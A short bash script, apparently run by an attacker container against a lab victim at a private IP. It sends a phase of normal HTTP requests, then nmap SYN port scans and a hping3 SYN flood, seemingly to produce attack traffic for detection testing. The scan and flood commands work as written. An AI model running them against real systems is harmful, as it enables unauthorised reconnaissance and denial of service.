#!/bin/bash
VICTIM="172.20.0.10"

echo "[*] Waiting for victim to be ready..."
sleep 5

echo "[*] Phase 1 - Normal traffic (30s)"
for i in $(seq 1 30); do
    curl -s http://$VICTIM/ > /dev/null
    curl -s http://$VICTIM/health > /dev/null
    sleep 1
done

echo "[*] Phase 2 - Port scan (nmap)"
nmap -sS -T4 -p 1-1000 $VICTIM

echo "[*] Phase 3 - SYN flood (hping3, 10s)"
timeout 10 hping3 -S --flood -V -p 80 $VICTIM || true

echo "[*] Phase 4 - Port scan wider range"
nmap -sS -T5 -p 1-65535 $VICTIM

echo "[*] Done. Attacker finished."